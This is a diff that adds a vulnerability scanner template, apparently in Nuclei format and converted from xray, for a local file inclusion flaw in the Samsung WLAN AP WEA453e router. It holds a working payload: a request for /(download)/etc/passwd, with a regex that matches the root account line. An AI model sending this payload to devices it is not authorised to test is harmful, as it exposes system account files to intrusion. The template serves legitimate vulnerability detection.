@@ -1,0 +1,35 @@
+id: poc-yaml-samsung-wlan-ap-wea453e-lfi
+
+info:
+  name: poc-yaml-samsung-wlan-ap-wea453e-lfi
+  author: Raiynin
+  severity: medium
+  tags: xray-converted,lfi
+  reference:
+    - https://ireadyoulearn.info/2020/11/27/exploiting-samsung-router-wlan-ap-wea453e/
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /(download)/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "root:(?P<passwd>.+?):0:0:0:/root:/bin/bash"
